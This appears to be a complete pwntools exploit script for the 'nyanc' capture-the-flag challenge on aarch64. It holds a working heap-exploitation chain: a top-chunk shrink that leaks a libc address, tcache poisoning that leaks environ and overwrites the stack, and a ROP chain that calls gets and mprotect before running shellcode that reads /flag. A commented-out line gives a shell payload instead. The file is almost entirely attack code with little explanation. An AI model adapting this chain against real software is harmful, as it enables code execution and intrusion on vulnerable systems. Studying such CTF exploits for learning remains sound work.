#!/usr/bin/env python
import sys
import os
from pwn import *


### SETUP ###

LOCAL=True
context.update(arch="aarch64", os="linux")
context.log_level = 'info'
#context.log_level = 'debug'

def m():
    for _ in xrange(6):
        p.recvuntil("\n")
    p.recvuntil("> ")

def add(l,d):
    p.sendline("1")
    p.recvuntil("len : ")
    p.sendline("{}".format(l))
    p.recvuntil("data : ")
    if l > 0:
        p.send(d)
    log.info(p.recvuntil("\n"))
    return

def view(idx):
    p.sendline("2")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    r = p.recvuntil("====")
    #log.info(r)
    return r

def edit(idx,d):
    p.sendline("3")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    p.recvuntil("data : ")
    p.send(d)
    return

def delete(idx):
    p.sendline("4")
    p.recvuntil("index : ")
    p.sendline("{}".format(idx))
    return

### SPLOIT ###
def sploit():
    # Step 1: Leak Libc pointer
    # create overflowing chunk
    m()
    add(0, "A") # 0
    # shrink top-chunk
    m()
    edit(0, "A" *24 + p64(0xd91) + "\0" * 0x20)
    # trigger sys-malloc -> free current top 
    m()
    add(0x1000, "B" * (0x1000-1)) # 1
    # get chunk with fd & bk set to libc-addrs
    m()
    add(0, "C") # 2
    # use up remaining old top_chunk
    m()
    add(0xd40, "D") # 3
    # leak libc-addr
    leak = view(2).split("data: ")[1].split("==")[0].ljust(8, '\0')
    libc.address = u64(leak) - 0x1540d0
    log.info("libc-base @ " + hex(libc.address))
    
    # cleanup
    m()
    delete(0)
    m()
    delete(1)
    m()
    delete(2)
    m()
    delete(3)
   
    # Step 2: Prepare write pointer (we need to do this before we can leak)
    # get top_chunk close to next page-alignment
    m()
    add(0xf00, "A") # 0
    # get overflowing chunk
    m()
    add(0, "B") # 1
    # shrink top_chunk to be in tcache range
    m()
    edit(1, "C" *24 + p64(0xc1) + "\0" * 0x40) # <- We use this one to forge the tcache-fd pointer for the write
    # trigger sysmalloc -> free top_chunk
    m()
    add(0x400, "D" * (0x400-1)) # 2
   
    # Step 3: Leak Stack pointer
    # get top_chunk close to next page-alignment
    m()
    add(0xb80, "A") # 3
    # get overflowing chunk
    m()
    add(0, "B") # 4
    # shrink top_chunk to be in tcache range
    m()
    edit(4, "C" *24 + p64(0x41) + "\0" * 0x40)
    # trigger sysmalloc -> free top_chunk
    m()
    add(0x400, "D" * (0x400-1)) # 5
    
    # overwrite tcache->next
    m()
    edit(4, "C" *24 + p64(0x21) + p64(libc.symbols["environ"]) + "\0" * 0x20)

    m()
    add(0x8, "E") # 6
 
    m()
    add(0, "F")  # 7
   
    # leak environ
    leak = view(7).split("data: ")[1].split("==")[0].ljust(8, '\0')
    environ = u64(leak)
    log.info("environ @ " + hex(environ))
    
    #STACK = environ - 0x188 
    #STACK = environ - 0x188 - 0x30
    STACK = environ - 0x178 
   
    # cleanup
    m()
    delete(0)
    m()
    delete(2)
    m()
    delete(3)
    m()
    delete(4)
    m()
    delete(5)
    m()
    delete(6)
    m()
    delete(7)
   
    # overwrite tcache->next
    m()
    edit(1, "C" *24 + p64(0xa1) + p64(STACK) + "\0" * 0x20)

    m()
    add(0x98, "E") # 0
    
    # overwrite stack
    
    ROP_CHAIN = STACK-0x200
    call_gets_gadget = libc.address + 0x62554 # 0x0000000000062554 : ldr x0, [x29, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
    
    payload = ""
    payload += p64(STACK+0x8)
    payload += p64(call_gets_gadget)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(ROP_CHAIN) # gets target
    payload += p64(libc.symbols['gets']+0x8) # offset 8 so we don't save fp
    
    m()
    add(0x98, payload) # 2
    
    # int mprotect(void *addr, size_t len, int prot);
    # mprotect(stack_base, 0x??????, 7);
        
    mov_x3_x4 = libc.address + 0x00000000000f3394 #: mov x4, x20 ; mov x3, x24 ; mov x0, x23 ; blr x22
    mov_x2_x1 = libc.address + 0x000000000006d294 #: mov x2, x19 ; mov x1, x0 ; mov x0, x3 ; blr x4
    load_x0 = libc.address + 0x62554    # : ldr x0, [x29, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
    pivot_branch = libc.address + 0x000000000006dd74 #: ldp x29, x30, [sp], #0x30 ; br x3
    
    
    mp_prot = 7
    mp_len = 0x1000
    mp_addr = ROP_CHAIN & ~0xfff
    
    SHELLCODE = ROP_CHAIN + 0x280
   
    rop_chain = ""
    distance = (STACK+0x10-ROP_CHAIN) - 0x30
    rop_chain = rop_chain.ljust(distance, 'A')
    mp_addr_ptr =  ROP_CHAIN + len(rop_chain) + 0x70
    rop_chain += p64(mp_addr_ptr - 0x18) # x29
    rop_chain += p64(mov_x3_x4) # x30
    rop_chain += p64(mp_prot) # x19
    rop_chain += p64(load_x0) # x20
    rop_chain += "A" * 8
    rop_chain += p64(mov_x2_x1) # x22
    rop_chain += p64(mp_len) # x23
    rop_chain += p64(libc.symbols['mprotect']) # x24
    rop_chain += "A"*0x20 # x25 + x26 + x27 + x28
    rop_chain += p64(ROP_CHAIN)
    rop_chain += p64(pivot_branch)
    rop_chain += p64(mp_addr) #
    rop_chain += "B" * 8
    rop_chain += p64(ROP_CHAIN)
    rop_chain += p64(SHELLCODE)
    rop_chain += "C" * 0x10
    
    shellcode = ""
    #shellcode += shellcraft.aarch64.breakpoint()
    #shellcode += shellcraft.aarch64.linux.sh()
    shellcode += shellcraft.aarch64.linux.cat('/flag')
    rop_chain += asm(shellcode)
    
   
    assert '\n' not in rop_chain
    log.info("ROP: " + hex(ROP_CHAIN))
    log.info("Shellcode: " + hex(SHELLCODE))
    p.sendline(rop_chain)
    
    p.interactive()
    return

if __name__=="__main__":

    elf = ELF("./nyanc")
    libc = ELF("./libc.so.6")
    if LOCAL:

        HOST = "127.0.0.1"
        PORT = 4242
        p = remote(HOST, PORT)
    else:
        HOST = "nyanc.teaser.insomnihack.ch"
        PORT = 1337
        p = remote(HOST, PORT)

    sploit()

